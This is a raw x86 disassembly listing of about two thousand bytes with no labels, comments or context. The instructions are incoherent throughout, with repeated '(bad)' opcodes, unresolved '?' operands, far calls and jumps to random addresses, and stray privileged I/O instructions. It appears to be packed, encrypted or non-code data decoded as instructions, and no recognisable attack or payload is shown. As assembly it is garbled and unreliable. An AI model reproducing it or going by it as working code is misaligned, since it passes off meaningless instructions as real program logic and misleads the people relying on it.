  4284e6:	lahf   
  4284e7:	cwde   
  4284e8:	rcr    BYTE PTR [edx],1
  4284ea:	mov    ebx,0xd6d24dbf
  4284ef:	inc    esp
  4284f0:	jne    0x428481
  4284f2:	cdq    
  4284f3:	push   ds
  4284f4:	lock cwde 
  4284f6:	add    esp,DWORD PTR [esi+esi*4+0x6eeda82e]
  4284fd:	fdivr  DWORD PTR [ebp-0x1d]
  428500:	mov    es,edx
  428502:	je     0x428529
  428504:	inc    ecx
  428505:	fnsave [esi]
  428507:	xchg   esi,eax
  428508:	sti    
  428509:	push   0x40506bd5
  42850e:	xor    ebp,DWORD PTR [ebx+0x8]
  428511:	call   0xfbcca2ec
  428516:	sub    eax,0x23cfe89a
  42851b:	jbe    0x428578
  42851d:	pusha  
  42851e:	imul   esi,DWORD PTR [eax],0xffffff97
  428521:	in     eax,dx
  428522:	mov    ebp,0x5b11f839
  428527:	mov    WORD PTR [ebx-0x52],cs
  42852a:	lods   eax,DWORD PTR ds:[esi]
  42852b:	ret    0x8b88
  42852e:	ins    DWORD PTR es:[edi],dx
  42852f:	out    dx,al
  428530:	pop    eax
  428531:	dec    edx
  428532:	fcomp  QWORD PTR [eax-0x2b92d17e]
  428538:	xchg   edi,eax
  428539:	mov    edi,0xb8536abe
  42853e:	mov    cl,0xb0
  428540:	add    eax,0xdde85112
  428545:	sbb    ebx,DWORD PTR [edx+edx*4+0x5b]
  428549:	push   edi
  42854a:	add    eax,0xcdc80d9f
  42854f:	add    eax,0xb64df252
  428554:	outs   dx,BYTE PTR ds:[esi]
  428555:	adc    al,0xb6
  428557:	xor    al,0xb3
  428559:	cmp    eax,0xc4211b07
  42855e:	mov    al,ds:0xeb61619e
  428563:	or     ch,ah
  428565:	(bad)  
  428566:	mov    edi,0x1c06371c
  42856b:	fisub  DWORD PTR [ebp+0xa55616d]
  428571:	sub    esi,DWORD PTR [edi-0x2]
  428574:	or     BYTE PTR [esp+ebx*4],ch
  428577:	jp     0x4285e7
  428579:	add    eax,0xc7efdb60
  42857e:	frstor [eax-0x31fd3d1f]
  428584:	mov    al,ds:0x7929a174
  428589:	lock adc edi,DWORD PTR [eax-0x4b]
  42858d:	clc    
  42858e:	and    BYTE PTR [eax-0x55],0x5d
  428592:	lahf   
  428593:	jns    0x42854f
  428595:	xchg   edx,eax
  428596:	mov    dl,0x45
  428598:	or     ebx,DWORD PTR [ebx-0x45]
  42859b:	aad    0x97
  42859d:	add    al,0xca
  42859f:	push   edx
  4285a0:	dec    edx
  4285a1:	(bad)  
  4285a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4285a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4285a4:	mov    DWORD PTR [eax],ebp
  4285a6:	mov    edx,0x274b1bb5
  4285ab:	and    bl,BYTE PTR [eax+0x2672e59]
  4285b1:	ficomp DWORD PTR [edx-0x7767ce18]
  4285b7:	out    0x29,eax
  4285b9:	jb     0x4285be
  4285bb:	les    ebp,FWORD PTR [ebp+0x6a4daed]
  4285c1:	jmp    0x3fda06d1
  4285c6:	fnsave [esi+0x2a596aa6]
  4285cc:	lahf   
  4285cd:	cmp    BYTE PTR [ebp-0x77559a89],dl
  4285d3:	in     eax,dx
  4285d4:	(bad)  
  4285d5:	ss add edx,ebp
  4285d8:	es jns 0x4285fb
  4285db:	inc    edi
  4285dc:	cmp    bh,bh
  4285de:	cmp    esi,DWORD PTR [esi+0x6da56c1b]
  4285e4:	sahf   
  4285e5:	imul   ebp,edi,0xffffffad
  4285e8:	cld    
  4285e9:	mov    esp,0xd2c4b2bc
  4285ee:	xchg   BYTE PTR [eax],cl
  4285f0:	cs (bad) 
  4285f2:	icebp  
  4285f3:	frstor [edi+0xd6db705]
  4285f9:	shl    BYTE PTR [eax-0x65bb99a7],1
  4285ff:	xlat   BYTE PTR ds:[ebx]
  428600:	mov    al,ds:0xdadca952
  428605:	fwait
  428606:	xor    edx,DWORD PTR [ebx-0x56]
  428609:	xchg   edi,eax
  42860a:	call   0xa281:0xb07d4f14
  428611:	push   eax
  428612:	jp     0x42859a
  428614:	lods   eax,DWORD PTR ds:[esi]
  428615:	adc    eax,0xba1e170a
  42861a:	add    eax,0xb3083970
  42861f:	jl     0x428617
  428621:	adc    BYTE PTR [ebx-0x27252291],bh
  428627:	xor    eax,0xdc7c4551
  42862c:	fcomip st,st(7)
  42862e:	(bad)  
  428630:	add    BYTE PTR [ebx+ebx*4+0x8],bh
  428634:	cs xchg ebp,eax
  428636:	dec    eax
  428637:	adc    DWORD PTR [ebx+ecx*8+0x3f],edx
  42863b:	dec    ecx
  42863c:	adc    edx,esp
  42863e:	outs   dx,BYTE PTR ds:[esi]
  42863f:	sbb    eax,0x6e495245
  428644:	out    dx,al
  428645:	fs jecxz 0x4285ed
  428648:	jbe    0x4285eb
  42864a:	inc    ebp
  42864b:	dec    DWORD PTR [esi-0x2ec7fcfd]
  428651:	sub    eax,0xbea8a554
  428656:	add    ebp,ebx
  428658:	and    BYTE PTR [eax+0x2a],bl
  42865b:	xor    al,BYTE PTR [ecx]
  42865d:	(bad)  
  42865e:	xchg   ebx,eax
  42865f:	xchg   esp,eax
  428660:	test   eax,0x1658dda8
  428665:	les    edi,FWORD PTR [esi+edi*2]
  428668:	int    0xf5
  42866a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42866b:	ins    BYTE PTR es:[edi],dx
  42866c:	ins    BYTE PTR es:[edi],dx
  42866d:	fild   DWORD PTR [esi+0x7b]
  428670:	mov    esp,0x310e12b0
  428675:	scas   al,BYTE PTR es:[edi]
  428676:	jmp    0x6784:0x723ad5b0
  42867d:	loopne 0x4286ab
  42867f:	inc    ebx
  428680:	das    
  428681:	imul   ebp,DWORD PTR [eax+0x3c0db1b8],0xffffffff
  428688:	fmul   QWORD PTR [edi-0x7aee1107]
  42868e:	push   0x434f76b7
  428693:	push   esi
  428694:	push   0xd57a494c
  428699:	imul   ebp,DWORD PTR [eax+0x2cc0b5b8],0xffffffa4
  4286a0:	cs dec edx
  4286a2:	dec    esi
  4286a3:	pop    ebx
  4286a4:	inc    esp
  4286a5:	loopne 0x4286e9
  4286a7:	or     esp,DWORD PTR [edx+0x31]
  4286aa:	sub    eax,0xb03a8143
  4286af:	fst    QWORD PTR [esi]
  4286b1:	call   0x977a:0xb4ac2441
  4286b8:	and    edi,DWORD PTR [ecx-0x29393934]
  4286be:	add    al,0xe6
  4286c0:	ret    0xfd8c
  4286c3:	push   es
  4286c4:	add    al,0x3
  4286c6:	adc    ebx,ebx
  4286c8:	ret    0x4ec2
  4286cb:	or     cl,BYTE PTR [edx]
  4286cd:	mov    ?,WORD PTR [esi+edx*2+0x3d]
  4286d1:	sbb    DWORD PTR ds:0xe24a2c51,0xffffffa6
  4286d8:	jecxz  0x42871b
  4286da:	mov    dh,0x76
  4286dc:	adc    BYTE PTR [eax-0x1f],dh
  4286df:	jae    0x42872d
  4286e1:	add    cl,BYTE PTR [eax+edi*2]
  4286e4:	and    DWORD PTR [ebx],0xffffffc0
  4286e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286e8:	push   cs
  4286e9:	add    BYTE PTR [eax],cl
  4286eb:	fisub  WORD PTR [ebx]
  4286ed:	ss dec edi
  4286ef:	sti    
  4286f0:	jge    0x428754
  4286f2:	pop    es
  4286f3:	or     edi,0xe99bee28
  4286f9:	(bad)  [edx-0x6b]
  4286fc:	gs jbe 0x4286a8
  4286ff:	mov    ds:0x9a3c6a6a,eax
  428704:	jno    0x428775
  428706:	movsx  ebx,WORD PTR [ebx+0x5a]
  42870a:	fcomp  st(2)
  42870c:	pop    ebp
  42870d:	sbb    eax,0x688ea832
  428712:	stos   BYTE PTR es:[edi],al
  428713:	jb     0x4286cb
  428715:	cld    
  428716:	inc    edx
  428717:	pop    ss
  428718:	jno    0x428707
  42871a:	inc    esi
  42871b:	call   0x3e00:0x8d85d3bd
  428722:	(bad)  
  428723:	mov    dh,0xd8
  428725:	adc    al,0xb5
  428727:	push   0xffffffdc
  428729:	pop    ecx
  42872a:	hlt    
  42872b:	test   al,0x9d
  42872d:	cwde   
  42872e:	sbb    BYTE PTR [ebx+0x5b],0xbf
  428732:	cmp    BYTE PTR [esi+edi*8-0x5515a102],0x6e
  42873a:	adc    al,0xc3
  42873c:	mov    ch,0xc2
  42873e:	jmp    0xb69cbc77
  428743:	add    eax,0x67dae31a
  428748:	daa    
  428749:	inc    esi
  42874a:	pop    es
  42874b:	aam    0xad
  42874d:	push   esp
  42874e:	sbb    BYTE PTR [edi+0x7b],dh
  428751:	sub    eax,0x1b95b56f
  428756:	pop    ebx
  428757:	xchg   esp,eax
  428758:	sbb    eax,0x1f64489f
  42875d:	adc    al,0xf5
  42875f:	mov    ds:0x43b88aed,eax
  428764:	adc    al,0x2d
  428766:	mov    eax,ds:0xf94ab1cf
  42876b:	or     bl,al
  42876d:	add    eax,0x6e6a1174
  428772:	rcl    BYTE PTR [ebp+0x76],1
  428775:	imul   ebx,ebx,0x2fd1fcba
  42877b:	inc    DWORD PTR [eax-0x7c33a921]
  428781:	cmp    ebx,ebx
  428783:	push   ss
  428784:	sbb    dh,BYTE PTR [edi+0x60363e17]
  42878a:	sbb    al,0x77
  42878c:	es dec eax
  42878e:	mov    esp,0x7010752e
  428793:	sbb    al,0xe4
  428795:	jne    0x4287ea
  428797:	ja     0x42877e
  428799:	shr    BYTE PTR [esi+0x6d],cl
  42879c:	popa   
  42879d:	fisttp DWORD PTR [edi+0x7c9fb94d]
  4287a3:	loope  0x42878e
  4287a5:	sub    DWORD PTR [eax+0x6c6b668],esi
  4287ab:	and    ch,BYTE PTR [edx+0x320f4c36]
  4287b1:	or     BYTE PTR [edx],0x36
  4287b4:	adc    DWORD PTR [edi],esi
  4287b6:	popaw  
  4287b8:	test   eax,0x516c130e
  4287bd:	je     0x4287d3
  4287bf:	ins    DWORD PTR es:[edi],dx
  4287c0:	dec    eax
  4287c1:	or     eax,0x5b934388
  4287c6:	push   ebx
  4287c7:	mov    ch,0xb5
  4287c9:	add    eax,0x30a616a3
  4287ce:	xor    edi,ebx
  4287d0:	jbe    0x42883f
  4287d2:	fisttp DWORD PTR [edx]
  4287d4:	push   eax
  4287d5:	jns    0x428796
  4287d7:	sbb    dl,bh
  4287d9:	pop    edi
  4287da:	push   esi
  4287db:	sub    dh,BYTE PTR [esi]
  4287dd:	les    ecx,FWORD PTR [ebp+0x10f254ed]
  4287e3:	test   BYTE PTR [esi*2-0x792924bf],bh
  4287ea:	mov    cl,0x80
  4287ec:	jp     0x4287be
  4287ee:	dec    ebx
  4287ef:	enter  0x9cd,0xb8
  4287f3:	mov    ch,0x1d
  4287f5:	push   esp
  4287f6:	mov    bl,BYTE PTR [edx+0x5f]
  4287f9:	mov    bl,0x6f
  4287fb:	mov    WORD PTR [esi],gs
  4287fd:	mov    dh,0x52
  4287ff:	sub    al,0x91
  428801:	pushf  
  428802:	rol    DWORD PTR [eax+ebp*2],1
  428805:	push   0x295bb6d8
  42880a:	push   0x56
  42880c:	pop    ds
  42880d:	mov    al,0x5c
  42880f:	add    eax,0x6cc395
  428814:	mov    edx,0x4cf1351
  428819:	adc    al,0xbc
  42881b:	inc    esi
  42881c:	xlat   BYTE PTR ds:[ebx]
  42881d:	loopne 0x428865
  42881f:	dec    ebp
  428820:	add    DWORD PTR [edi-0x60bbc2eb],ebx
  428826:	fcom   DWORD PTR ds:0xca6d0bb0
  42882c:	adc    al,0x3
  42882e:	adc    ecx,edx
  428830:	jecxz  0x428839
  428832:	mov    ebx,0xfa331282
  428837:	pop    ecx
  428838:	inc    edi
  428839:	mov    ebx,DWORD PTR [ebx]
  42883b:	ins    DWORD PTR es:[edi],dx
  42883c:	stos   DWORD PTR es:[edi],eax
  42883d:	add    DWORD PTR [edx+0x60],esp
  428840:	jmp    DWORD PTR [ebp-0x66]
  428843:	pop    esi
  428844:	adc    DWORD PTR [eax],ecx
  428846:	pop    eax
  428847:	sub    bl,bl
  428849:	hlt    
  42884a:	sbb    DWORD PTR [ebp-0x63],esp
  42884d:	xchg   edi,eax
  42884e:	xchg   BYTE PTR [ebx-0x7c2525f8],bh
  428854:	aas    
  428855:	les    eax,FWORD PTR [edx-0x3a]
  428858:	sahf   
  428859:	lods   eax,DWORD PTR ds:[esi]
  42885a:	mov    BYTE PTR [edx+0x7],0x14
  42885e:	sti    
  42885f:	jmp    0x27272983
  428864:	add    dh,BYTE PTR [esi-0x7670d225]
  42886a:	cwde   
  42886b:	cwde   
  42886c:	lock cmp BYTE PTR [edx+0x7],ch
  428870:	adc    eax,0x6e1750db
  428875:	data16 xor BYTE PTR [ecx-0x57fc9d4e],dl
  42887c:	mov    ecx,esp
  42887e:	sbb    bh,al
  428880:	or     eax,0xa689616
  428885:	xor    al,0xc0
  428887:	add    al,0xe1
  428889:	adc    ah,ch
  42888b:	sub    DWORD PTR [eax-0x58],ebp
  42888e:	fst    QWORD PTR [edx-0x67fd097d]
  428894:	mov    dh,0xc9
  428896:	mov    ch,BYTE PTR [ebp+0x13]
  428899:	mov    ah,0x45
  42889b:	jmp    0xdbfd:0xb6b9f97e
  4288a2:	repnz rol BYTE PTR [esi+0x3ed81c00],cl
  4288a9:	repnz add dl,bl
  4288ac:	stos   DWORD PTR es:[edi],eax
  4288ad:	and    ecx,DWORD PTR [edx*1-0x31b41a5e]
  4288b4:	jp     0x4288cd
  4288b6:	add    BYTE PTR [esi],ch
  4288b8:	jb     0x42888a
  4288ba:	push   edi
  4288bb:	sub    al,0x75
  4288bd:	mov    cl,0x5
  4288bf:	stc    
  4288c0:	repz or DWORD PTR [esi],edi
  4288c3:	not    DWORD PTR [esi+0x6d8286a5]
  4288c9:	rol    DWORD PTR [ebx-0x736b3a08],0xd7
  4288d0:	ins    DWORD PTR es:[edi],dx
  4288d1:	pop    ebx
  4288d2:	fcmovnbe st,st(7)
  4288d4:	push   cs
  4288d5:	mov    DWORD PTR [eax+0x4a],ebx
  4288d8:	mov    ecx,0xbdea979
  4288dd:	pop    edi
  4288de:	push   edx
  4288df:	mov    ds:0xa6ddb1b0,eax
  4288e4:	dec    esi
  4288e5:	and    ah,BYTE PTR [esi-0x59e4cd5d]
  4288eb:	lea    esp,[ebp+0x64b1a889]
  4288f1:	sbb    eax,0xd899d3f9
  4288f6:	dec    esp
  4288f7:	or     ebp,DWORD PTR [ecx-0x586119e9]
  4288fd:	les    esi,FWORD PTR [eax-0x4c2b5c8f]
  428903:	xor    DWORD PTR [edx+edi*4],ebp
  428906:	jmp    DWORD PTR [ecx+0x280de845]
  42890c:	inc    esp
  42890d:	scas   al,BYTE PTR es:[edi]
  42890e:	cmp    bh,BYTE PTR [esi+edx*8+0x2868521]
  428915:	outs   dx,BYTE PTR ds:[esi]
  428916:	xchg   BYTE PTR ds:0x4f7863be,cl
  42891c:	and    DWORD PTR [eax-0x25927dfb],esp
  428922:	or     esi,DWORD PTR [esi+0x6d]
  428925:	xor    eax,0x4750b044
  42892a:	shl    al,1
  42892c:	mov    es,WORD PTR [ebx]
  42892e:	mov    al,0x11
  428930:	mov    ch,0x6d
  428932:	add    DWORD PTR [ecx-0x32],edx
  428935:	int    0xe3
  428937:	les    eax,FWORD PTR [ecx-0x45]
  42893a:	jne    0x42898d
  42893c:	(bad)  
  42893e:	pop    DWORD PTR [edx+ecx*2+0x6dc6d21a]
  428945:	ret    
  428946:	sub    al,0xb7
  428948:	jnp    0x4288d6
  42894a:	(bad)  
  42894b:	iret   
  42894c:	inc    edx
  42894d:	cmp    al,0xe6
  42894f:	mov    dh,0xd0
  428951:	add    eax,0x49b037db
  428956:	retf   0x6db3
  428959:	jbe    0x4288de
  42895b:	adc    BYTE PTR [eax-0xab215f5],dh
  428961:	xor    al,0x28
  428963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428964:	mov    ah,0xed
  428966:	mov    dh,0xd0
  428968:	imul   BYTE PTR [ebx-0x7e]
  42896b:	mov    ebp,0xc5b03b8c
  428970:	cmp    edx,DWORD PTR [esi-0x5b]
  428973:	push   cs
  428974:	and    BYTE PTR [esi-0x58],ch
  428977:	jg     0x42891f
  428979:	and    eax,ecx
  42897b:	sub    DWORD PTR [edx+0x73c45c95],ebp
  428981:	(bad)  
  428982:	sbb    DWORD PTR [eax],ebx
  428984:	pop    esp
  428985:	mov    al,0x44
  428987:	sbb    ecx,DWORD PTR ds:0xfc67cf74
  42898d:	or     BYTE PTR [ebx],ch
  42898f:	pop    es
  428990:	lods   eax,DWORD PTR ds:[esi]
  428991:	test   al,0x85
  428993:	jns    0x4289f7
  428995:	enter  0xa3eb,0x5b
  428999:	stos   DWORD PTR es:[edi],eax
  42899a:	push   ss
  42899b:	scas   eax,DWORD PTR es:[edi]
  42899c:	adc    al,0x25
  42899e:	mov    eax,0xd1fd381f
  4289a3:	jbe    0x4289a6
  4289a5:	jo     0x4289bd
  4289a7:	leave  
  4289a8:	mov    ebp,0xfe62905f
  4289ad:	(bad)  
  4289ae:	in     eax,dx
  4289af:	mov    dh,0xde
  4289b1:	pop    esp
  4289b2:	xlat   BYTE PTR ds:[ebx]
  4289b3:	or     DWORD PTR [edi-0x1d21b9b0],ebp
  4289b9:	add    BYTE PTR [ebp+0x76],ch
  4289bc:	add    BYTE PTR [ebx-0x56],al
  4289bf:	ret    0x5a06
  4289c2:	pop    edx
  4289c3:	clc    
  4289c4:	ficom  DWORD PTR ds:0x9d325611
  4289ca:	pop    eax
  4289cb:	and    ch,BYTE PTR [eax-0x25]
  4289ce:	pushf  
  4289cf:	push   0xfe4b0e64
  4289d4:	push   es
  4289d5:	test   al,0x8e
  4289d7:	xchg   BYTE PTR [eax+ecx*2+0x633718db],bl
  4289de:	or     ebx,DWORD PTR [ecx+eax*8]
  4289e1:	fst    DWORD PTR [ecx+eax*1]
  4289e4:	jl     0x42897c
  4289e6:	cmp    al,0xea
  4289e8:	(bad)  
  4289e9:	inc    eax
  4289ea:	jo     0x4289b8
  4289ec:	sub    eax,0x55a43529
  4289f1:	das    
  4289f2:	and    DWORD PTR [eax+0x29],0x4f7b2ba
  4289f9:	inc    ebx
  4289fa:	xlat   BYTE PTR ds:[ebx]
  4289fb:	push   ss
  4289fc:	fisubr DWORD PTR [ebp-0x5f]
  4289ff:	mov    bl,0x2b
  428a01:	xor    edx,ebx
  428a03:	data16 mov WORD PTR [esi],?
  428a06:	and    ah,BYTE PTR [eax+0x1d]
  428a09:	push   eax
  428a0a:	aaa    
  428a0b:	ss adc eax,0x5fe24292
  428a11:	xchg   ebx,eax
  428a12:	iret   
  428a13:	ret    0xb02
  428a16:	sbb    edx,DWORD PTR [ecx+0x54]
  428a19:	jl     0x428a62
  428a1b:	arpl   cx,si
  428a1d:	jg     0x428a41
  428a1f:	fisubr DWORD PTR [esi-0x13]
  428a22:	jo     0x428a81
  428a24:	mov    dl,0x89
  428a26:	sub    al,0xd6
  428a28:	xchg   cl,ah
  428a2a:	xchg   edi,eax
  428a2b:	ss mov dh,0xba
  428a2e:	inc    ebp
  428a2f:	lods   al,BYTE PTR ds:[esi]
  428a30:	xchg   ecx,eax
  428a31:	stos   BYTE PTR es:[edi],al
  428a32:	cdq    
  428a33:	pop    eax
  428a34:	imul   edx,edx,0xffffffe9
  428a37:	mov    dh,0x6d
  428a39:	dec    ebp
  428a3a:	adc    DWORD PTR [edi],esp
  428a3c:	xchg   BYTE PTR [edi+0x652d148e],cl
  428a42:	rol    DWORD PTR [esi+0x5983db80],0x69
  428a49:	fisttp QWORD PTR [ecx]
  428a4b:	jo     0x428a15
  428a4d:	and    bh,BYTE PTR [eax+0x31e900d1]
  428a53:	cmp    al,0xd1
  428a55:	repz mov dh,0xd0
  428a58:	inc    ecx
  428a59:	cmp    esi,DWORD PTR [esi]
  428a5b:	outs   dx,BYTE PTR ds:[esi]
  428a5c:	test   al,0x7c
  428a5e:	in     al,0x79
  428a60:	dec    esi
  428a61:	adc    DWORD PTR [edx-0x3424a493],edi
  428a67:	fstp   st(5)
  428a69:	hlt    
  428a6a:	test   BYTE PTR [esi],0x7
  428a6d:	add    cl,BYTE PTR [ebx-0x24929226]
  428a73:	(bad)  
  428a74:	adc    ecx,DWORD PTR [ecx+0x6565f8cd]
  428a7a:	jmp    0xc0b79f6a
  428a7f:	push   cs
  428a80:	mov    edx,0xbb4ccbe6
  428a85:	fwait
  428a86:	jmp    0x428aa9
  428a88:	inc    esp
  428a89:	cs cmp al,0x50
  428a8c:	mov    cl,0xb9
  428a8e:	xchg   edx,eax
  428a8f:	adc    ebp,DWORD PTR [ebp+0xbc48f97]
  428a95:	pusha  
  428a96:	mov    al,ds:0x46a1d1d8
  428a9b:	in     eax,0x19
  428a9d:	fcmovnbe st,st(6)
  428a9f:	mov    eax,0x92900e6d
  428aa4:	and    al,0xef
  428aa6:	stos   DWORD PTR es:[edi],eax
  428aa7:	imul   edi,DWORD PTR [ecx+0x4d],0xffffffe8
  428aab:	mov    dh,0x21
  428aad:	add    BYTE PTR [ebp-0x1f597130],0xc7
  428ab4:	rol    DWORD PTR [eax-0x48b523fb],cl
  428aba:	and    esp,DWORD PTR [ebx-0x60]
  428abd:	inc    ecx
  428abe:	or     esp,DWORD PTR [esi-0x492d177b]
  428ac4:	xor    eax,0x5b05e807
  428ac9:	das    
  428aca:	mov    al,0xbc
  428acc:	adc    DWORD PTR [edi],eax
  428ace:	add    BYTE PTR [eax+ebp*8-0x7e],bl
  428ad2:	push   ebp
  428ad3:	jl     0x428ac9
  428ad5:	fs out dx,eax
  428ad7:	in     eax,dx
  428ad8:	(bad)  
  428ad9:	(bad)  
  428ada:	jbe    0x428afa
  428adc:	aam    0xf1
  428ade:	enter  0x6d7d,0xe4
  428ae2:	adc    BYTE PTR [ebx+0x1c17685f],bh
  428ae8:	ins    BYTE PTR es:[edi],dx
  428ae9:	cmc    
  428aea:	xor    cl,dl
  428aec:	cs pop ebp
  428aee:	lds    ecx,FWORD PTR [ecx+0x5db6b715]
  428af4:	and    eax,0xa2b0aa9e
  428af9:	xor    eax,0x6eb8fd32
  428afe:	or     ebp,DWORD PTR [ebp+0x17]
  428b01:	cmp    cl,BYTE PTR [eax]
  428b03:	and    BYTE PTR [edi+ebx*8+0x7ee102bc],bh
  428b0a:	ins    DWORD PTR es:[edi],dx
  428b0b:	or     BYTE PTR [edx-0x21dc492c],bh
  428b11:	(bad)  
  428b12:	popa   
  428b13:	mov    eax,0x5db5b8cf
  428b18:	adc    al,0x1d
  428b1a:	jle    0x428a9c
  428b1c:	adc    edi,edx
  428b1e:	lock pop ebx
  428b20:	fstp   st(2)
  428b22:	retf   0x1217
  428b25:	and    eax,DWORD PTR [eax]
  428b27:	loopne 0x428b2c
  428b29:	adc    al,0xb0
  428b2b:	hlt    
  428b2c:	rcl    BYTE PTR [eax-0xaf5e893],1
  428b32:	push   eax
  428b33:	stc    
  428b34:	push   ss
  428b35:	imul   DWORD PTR [edi+ecx*4]
  428b38:	inc    ecx
  428b39:	sbb    DWORD PTR [eax+esi*4+0x2cd91135],esi
  428b40:	aam    0x5e
  428b42:	sbb    DWORD PTR [ebp+esi*1+0x4342b701],esi
  428b49:	sbb    eax,0x7d4321af
  428b4e:	loopne 0x428b16
  428b50:	push   esi
  428b51:	mov    eax,0xcd65074d
  428b56:	fld    QWORD PTR [esi]
  428b58:	leave  
  428b59:	pop    ecx
  428b5a:	xchg   BYTE PTR [eax],dl
  428b5c:	mov    bh,0xad
  428b5e:	or     ebp,DWORD PTR [edi-0x1818206]
  428b64:	push   eax
  428b65:	pusha  
  428b66:	ss cs ins DWORD PTR es:[edi],dx
  428b69:	pop    ebp
  428b6a:	aad    0xfb
  428b6c:	or     BYTE PTR [edx],bl
  428b6e:	push   eax
  428b6f:	lds    edx,FWORD PTR [ebx+0x6d800d24]
  428b75:	imul   ebx,ebx,0xe68f56b6
  428b7b:	and    BYTE PTR [ebx+0x5500df7a],bl
  428b81:	aaa    
  428b82:	call   0xc2b9:0xcb576c85
  428b89:	inc    esi
  428b8a:	imul   ebx,ebx,0x30
  428b8d:	inc    eax
  428b8e:	adc    dl,BYTE PTR [edi]
  428b90:	push   ds
  428b91:	push   ebp
  428b92:	mov    edx,0xdb40b23c
  428b97:	push   cs
  428b98:	jmp    0xd7e9:0x39a73d87
  428b9f:	inc    edx
  428ba0:	mov    ds:0x4575b6e,al
  428ba5:	cmp    BYTE PTR [ebx-0x49],dl
  428ba8:	fimul  DWORD PTR [ebx-0x7b]
  428bab:	push   esi
  428bac:	push   ss
  428bad:	pop    esp
  428bae:	in     al,dx
  428baf:	dec    ebx
  428bb0:	push   ds
  428bb1:	add    eax,0xfe620187
  428bb6:	pusha  
  428bb7:	adc    esi,ecx
  428bb9:	jmp    0x428bed
  428bbb:	mov    eax,ds:0x4a55bcd6
  428bc0:	and    edx,DWORD PTR [ebp+esi*4+0x6a26c05d]
  428bc7:	bound  ecx,QWORD PTR [esp+ebx*4]
  428bca:	sbb    bl,BYTE PTR ds:0xaa1adb95
  428bd0:	cs into 
  428bd2:	sub    bh,ah
  428bd4:	mov    ebx,0x7acd17ab
  428bd9:	(bad)  
  428bda:	mov    ah,BYTE PTR [ebp+0x6768ac6d]
  428be0:	push   eax
  428be1:	rcl    DWORD PTR [ecx+0x53],1
  428be4:	jbe    0x428b89
  428be6:	or     esp,eax
  428be8:	bound  esi,QWORD PTR [edx]
  428bea:	or     eax,0x64d8e7ec
  428bef:	xchg   edx,eax
  428bf0:	pop    es
  428bf1:	inc    ebp
  428bf2:	xchg   edi,eax
  428bf3:	ficom  DWORD PTR [ecx]
  428bf5:	lds    ebx,FWORD PTR [ebx-0x25e0c1e0]
  428bfb:	sbb    BYTE PTR cs:[ebx-0x61],0xaa
  428c00:	lock shl al,1
  428c03:	fistp  DWORD PTR [eax]
  428c05:	ja     0x428c0d
  428c07:	pop    ebp
  428c08:	adc    ah,bl
  428c0a:	sbb    al,0x2c
  428c0d:	cwde   
  428c0e:	mov    DWORD PTR fs:[esi-0x3115f97d],edx
  428c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c16:	in     al,0xd6
  428c18:	pop    ss
  428c19:	xchg   esp,eax
  428c1a:	pop    esp
  428c1b:	ficomp DWORD PTR [edx]
  428c1d:	(bad)
  428c20:	sub    al,0x7e
  428c22:	push   cs
  428c23:	jg     0x428c55
  428c25:	push   ss
  428c26:	mov    cl,0x35
  428c28:	inc    esp
  428c29:	dec    ebp
  428c2a:	popa   
  428c2b:	out    0x79,al
  428c2d:	or     eax,0xdb6c455d
  428c32:	lock xchg ebp,eax
  428c34:	cmp    al,0xc5
  428c36:	les    ebx,FWORD PTR [ecx]
  428c38:	pop    edi
  428c39:	sbb    ecx,DWORD PTR [ebx+0x1b]
  428c3c:	sbb    ecx,esp
  428c3e:	imul   ebp,DWORD PTR [ecx+0x1b],0xffffff8f
  428c42:	dec    edx
  428c43:	adc    cl,BYTE PTR [eax+eax*1-0x26eba524]
  428c4a:	mov    DWORD PTR [edx+0x1c],edi
  428c4d:	or     esp,eax
  428c4f:	mov    dh,0x75
  428c51:	aas    
  428c52:	cld    
  428c53:	imul   edx,DWORD PTR [edx],0x5c
  428c56:	mov    ch,0x4d
  428c58:	sub    eax,DWORD PTR [ecx-0x39527a3a]
  428c5e:	je     0x428c35
  428c60:	mov    ecx,DWORD PTR [edi-0x4bb1a8d5]
  428c66:	ins    DWORD PTR es:[edi],dx
  428c67:	sub    DWORD PTR [edx-0x11],esp
  428c6a:	ins    BYTE PTR es:[edi],dx
  428c6b:	adc    eax,0x6d655cbf
  428c70:	mov    bh,0xad
  428c72:	inc    eax
  428c73:	div    edx
  428c75:	jns    0x428cc7
  428c77:	jmp    0x428c54
  428c79:	(bad)  
  428c7a:	loop   0x428ca5
  428c7c:	bound  ebp,QWORD PTR [ebx+0x17]
  428c7f:	pop    edi
  428c80:	cld    
  428c81:	into   
  428c82:	sbb    al,0xef
  428c84:	push   esp
  428c85:	add    eax,0x55b4b288
  428c8a:	inc    esp
  428c8b:	lods   eax,DWORD PTR ds:[esi]
  428c8c:	push   ebp
  428c8d:	mov    cl,0x54
  428c8f:	pop    ebp
  428c90:	sub    BYTE PTR [ebp-0x4],dl
  428c93:	sbb    al,0xb3
  428c95:	test   DWORD PTR [ebp-0x7889d55a],0x9e5e7041
  428c9f:	lea    edx,[ecx+0x17]
  428ca2:	push   ss
  428ca3:	fisub  DWORD PTR [ebx-0x39]
  428ca6:	jge    0x428c3f
  428ca8:	push   esp
  428ca9:	sub    BYTE PTR [ebx+0x2b],bl
  428cac:	lods   eax,DWORD PTR ds:[esi]
  428cad:	and    DWORD PTR [edx-0x5f09e1f3],ecx
  428cb3:	ret    0xfb9c
  428cb6:	push   ebx
  428cb7:	adc    DWORD PTR [edi],edx
  428cb9:	mov    dh,0xa2
  428cbb:	mov    dh,0x65
  428cbd:	shl    BYTE PTR [esp+ebp*2+0x45adb7c8],1
  428cc4:	pop    ebx
  428cc5:	bound  esi,QWORD PTR [esi-0x610488f9]
  428ccb:	and    edi,ebp
  428ccd:	icebp  
  428cce:	add    bl,al
  428cd0:	outs   dx,BYTE PTR ds:[esi]
  428cd1:	pop    ds
  428cd2:	or     DWORD PTR [ebx],ebp
  428cd4:	mov    bl,0x36
  428cd6:	push   cs
  428cd7:	out    dx,eax
  428cd8:	jle    0x428c5c
  428cda:	ss inc esp
  428cdc:	ins    DWORD PTR es:[edi],dx
  428cdd:	push   esi
  428cde:	jecxz  0x428d2e
  428ce0:	cmp    DWORD PTR [esi+0x54],ecx
  428ce3:	lea    ebp,[ebp-0x1cf3924b]
  428ce9:	ret    
  428cea:	cmc    
